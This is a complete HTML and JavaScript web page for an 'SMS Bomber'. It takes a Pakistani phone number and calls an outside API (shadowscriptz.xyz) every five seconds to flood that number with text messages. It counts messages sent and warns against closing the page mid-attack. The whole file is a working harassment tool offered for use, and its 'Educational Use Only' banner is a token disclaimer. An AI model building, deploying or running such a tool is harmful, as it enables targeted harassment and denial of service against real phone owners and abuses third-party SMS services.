<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bomber</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 450px;
            text-align: center;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
        }
        
        .input-group {
            margin-bottom: 25px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: bold;
            font-size: 16px;
        }
        
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            background: #f8f9fa;
        }
        
        input:focus {
            border-color: #ff6b6b;
            outline: none;
            background: white;
        }
        
        .button-group {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        button {
            flex: 1;
            padding: 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        #startBtn {
            background: #28a745;
            color: white;
        }
        
        #startBtn:hover {
            background: #218838;
            transform: translateY(-2px);
        }
        
        #stopBtn {
            background: #dc3545;
            color: white;
            display: none;
        }
        
        #stopBtn:hover {
            background: #c82333;
            transform: translateY(-2px);
        }
        
        .status-container {
            margin: 20px 0;
        }
        
        .status {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            font-weight: bold;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 2px solid #c3e6cb;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 2px solid #f5c6cb;
        }
        
        .status.running {
            background: #fff3cd;
            color: #856404;
            border: 2px solid #ffeaa7;
        }
        
        .counter {
            font-size: 18px;
            font-weight: bold;
            color: #333;
            margin: 15px 0;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 8px;
        }
        
        .loader {
            margin: 15px 0;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff6b6b;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            margin: 15px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #28a745, #20c997);
            width: 0%;
            transition: width 0.3s;
        }
        
        .info {
            background: #e7f3ff;
            padding: 12px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 12px;
            color: #0066cc;
            border-left: 4px solid #0066cc;
        }
        
        .auto-status {
            font-size: 14px;
            color: #666;
            margin: 10px 0;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>💣 SMS BOMBER</h1>
        <p class="subtitle">Automatic Continuous SMS Sending</p>
        
        <div class="input-group">
            <label for="phoneNumber">Enter Phone Number:</label>
            <input type="text" id="phoneNumber" placeholder="923001234567" maxlength="12">
            <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">
                Format: 923001234567 (Pakistan)
            </small>
        </div>
        
        <div class="button-group">
            <button id="startBtn">🚀 START BOMBING</button>
            <button id="stopBtn">🛑 STOP BOMBING</button>
        </div>
        
        <div class="status-container">
            <div class="status" id="status" style="display: none;"></div>
            <div class="counter" id="counter">Messages Sent: 0</div>
            <div class="auto-status" id="autoStatus">Auto-send: Ready</div>
        </div>
        
        <div class="loader" id="loader" style="display: none;">
            <div class="spinner"></div>
        </div>
        
        <div class="progress-bar">
            <div class="progress" id="progress"></div>
        </div>
        
        <div class="info">
            ⚠️ <strong>Educational Use Only</strong> - This tool is for testing and educational purposes. 
            Use responsibly and only on numbers you have permission to test.
        </div>
    </div>

    <script>
        // DOM elements
        const phoneNumber = document.getElementById('phoneNumber');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const status = document.getElementById('status');
        const counter = document.getElementById('counter');
        const loader = document.getElementById('loader');
        const progress = document.getElementById('progress');
        const autoStatus = document.getElementById('autoStatus');
        
        // Variables
        let messageCount = 0;
        let isBombing = false;
        let bombingInterval;
        let progressInterval;
        
        // API URL
        const API_URL = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=';
        
        // Start SMS bombing
        startBtn.addEventListener('click', () => {
            const number = phoneNumber.value.trim();
            
            if (!number) {
                showStatus('❌ Please enter a phone number', 'error');
                phoneNumber.focus();
                return;
            }
            
            if (!isValidNumber(number)) {
                showStatus('❌ Invalid number format (923001234567)', 'error');
                phoneNumber.focus();
                return;
            }
            
            // Disable input and start bombing
            phoneNumber.disabled = true;
            startBtn.style.display = 'none';
            stopBtn.style.display = 'block';
            loader.style.display = 'block';
            isBombing = true;
            messageCount = 0;
            
            showStatus('🚀 SMS Bombing Started! Auto-sending every 5 seconds...', 'running');
            updateCounter();
            startAutoBombing(number);
        });
        
        // Stop SMS bombing
        stopBtn.addEventListener('click', () => {
            stopAutoBombing();
            showStatus('🛑 SMS Bombing Stopped', 'error');
        });
        
        // Validate phone number
        function isValidNumber(number) {
            return /^92\d{10}$/.test(number);
        }
        
        // Start auto bombing
        function startAutoBombing(number) {
            if (!isBombing) return;
            
            // Send first message immediately
            sendSMS(number);
            
            // Set up interval for continuous sending
            bombingInterval = setInterval(() => {
                if (isBombing) {
                    sendSMS(number);
                }
            }, 5000); // Send every 5 seconds
            
            // Progress bar animation
            let progressWidth = 0;
            progressInterval = setInterval(() => {
                if (!isBombing) return;
                
                progressWidth += 1;
                if (progressWidth >= 100) {
                    progressWidth = 0;
                }
                progress.style.width = progressWidth + '%';
                
                // Update auto status
                const timeLeft = Math.ceil((5000 - (progressWidth * 50)) / 1000);
                autoStatus.textContent = `Next message in: ${timeLeft}s`;
                
            }, 50);
        }
        
        // Send SMS using API
        async function sendSMS(number) {
            if (!isBombing) return;
            
            try {
                const apiUrl = API_URL + number;
                console.log('Sending SMS to:', number);
                
                // Show sending status
                autoStatus.textContent = 'Sending message...';
                autoStatus.style.color = '#ff6b6b';
                
                const response = await fetch(apiUrl);
                
                if (response.ok) {
                    messageCount++;
                    updateCounter();
                    showStatus(`✅ Message ${messageCount} sent successfully!`, 'success');
                    autoStatus.style.color = '#28a745';
                } else {
                    showStatus('❌ Failed to send message', 'error');
                    autoStatus.style.color = '#dc3545';
                }
                
            } catch (error) {
                console.error('Error sending SMS:', error);
                showStatus('❌ Network error - retrying...', 'error');
                autoStatus.style.color = '#dc3545';
            }
        }
        
        // Stop auto bombing
        function stopAutoBombing() {
            isBombing = false;
            clearInterval(bombingInterval);
            clearInterval(progressInterval);
            
            phoneNumber.disabled = false;
            startBtn.style.display = 'block';
            stopBtn.style.display = 'none';
            loader.style.display = 'none';
            progress.style.width = '0%';
            autoStatus.textContent = 'Auto-send: Stopped';
            autoStatus.style.color = '#666';
        }
        
        // Update counter
        function updateCounter() {
            counter.textContent = `Messages Sent: ${messageCount}`;
            document.title = `SMS Bomber (${messageCount})`;
        }
        
        // Show status message
        function showStatus(message, type) {
            status.textContent = message;
            status.className = 'status ' + type;
            status.style.display = 'block';
        }
        
        // Auto-format phone number input
        phoneNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            
            // Ensure it starts with 92
            if (!value.startsWith('92')) {
                value = '92' + value;
            }
            
            // Limit to 12 digits
            if (value.length > 12) {
                value = value.substring(0, 12);
            }
            
            e.target.value = value;
        });
        
        // Enter key support
        phoneNumber.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                startBtn.click();
            }
        });
        
        // Auto-focus on input
        phoneNumber.focus();
        
        // Prevent accidental page close
        window.addEventListener('beforeunload', (e) => {
            if (isBombing) {
                e.preventDefault();
                e.returnValue = 'SMS bombing is in progress. Are you sure you want to leave?';
                return 'SMS bombing is in progress. Are you sure you want to leave?';
            }
        });
        
        // Show initial instructions
        showStatus('💡 Enter phone number and click START to begin auto-bombing', 'running');
    </script>
</body>
</html>
